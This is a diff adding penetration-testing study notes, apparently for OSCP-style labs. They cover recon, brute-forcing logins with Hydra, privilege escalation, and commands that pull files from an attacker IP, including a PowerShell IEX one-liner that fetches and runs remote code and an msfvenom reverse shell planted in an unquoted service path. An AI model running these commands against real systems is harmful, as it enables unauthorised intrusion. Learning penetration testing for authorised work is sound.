@@ -1,0 +1,87 @@
+Methodology 
+Linux:
+Enumerate FTP
+Run nmap
+Run Dirbuster, Gobuster, and Dirsearch
+Run Nikto
+Enumerate ports
+Navigate webpage and look for software versions
+Check Source Code
+Check Searchsploit
+Check Exploit-DB on software versions discovered
+Check for Upload Functionalities
+Check for LFI
+If we’re on a login page, but have no where to locate a username, let alone a potential password, run cewl on the target to generate a wordlist and use that with Hydra http-get.
+Test images found with exiftool or strings
+ 
+Windows:
+Enumerate FTP
+Run nmap
+Run Dirbuster, Gobuster, and Dirsearch
+Run Nikto
+Enumerate ports
+Navigate webpage and look for software versions
+Check Source Code
+Check Searchsploit
+Check Exploit-DB on software versions discovered
+Check for Upload Functionalities
+Check for LFI
+If we’re on a login page, but have no where to locate a username, let alone a potential password, run cewl on the target to generate a wordlist and use that with Hydra http-get.
+Test images found with exiftool or strings
+ 
+File transfers:
+LINUX:
+Wget [our IP:8000]/[File]
+curl http://192.168.1.2/filename.txt -o filename.txt
+
+https://hackersinterview.com/oscp/oscp-cheatsheet-linux-file-transfer-techniques/
+WINDOWS:
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')
+
+certutil.exe -urlcache -split -f "http://192.168.1.2/exploit.exe"
+
+Powershell "IEX(New-Object Net.WebClient).downloadString(http://[our ip and port:]8000/[File] file)"
+
+https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/
+
+Reverse shells:
+https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/
+ 
+PRIVILEGE ESCALATION:
+Linux:
+Upgrade shell Python -c 'import pty;pty.spawn("/bin/bash")'
+Run ls -la on all folders to detect hidden files and check permissions
+Run whoami
+Run env
+Run id
+Run Hostname
+Run uname -a
+Run pwd
+Navigate to tmp folder
+Check /etc/motd
+Check /etc/passwd
+Upload Linux Smart Enumeration tool
+Run Enumeration tool
+With Linux Smart Enumeration look at the following:
+1. Writable files outside user's home
+2. Binaries with setuid bit
+3. And Useful binaries
+ 
+Windows:
+Run ' .\accesschk.exe /accepteula -iwcqv user daclsvc' to check current access permissions
+ 
+.\accesschk.exe /accepteula -ucqv user unquotedsvc to check Unquoted Service Paths
+1. If we find one, create exploit with msfvenom with same name, upload to target file path for reverse shell. 
+ 
+The whoami command can be used to list our user's privileges
+1. Whoami /priv
+ 
+Run get users
+Arp -a
+Netstat -ano
+Schtasks /query /fo LIST /v
+ 
+Start/Stop a Service
+1. Net start/stop <name>
+ 
+Upload and run WinPEAS
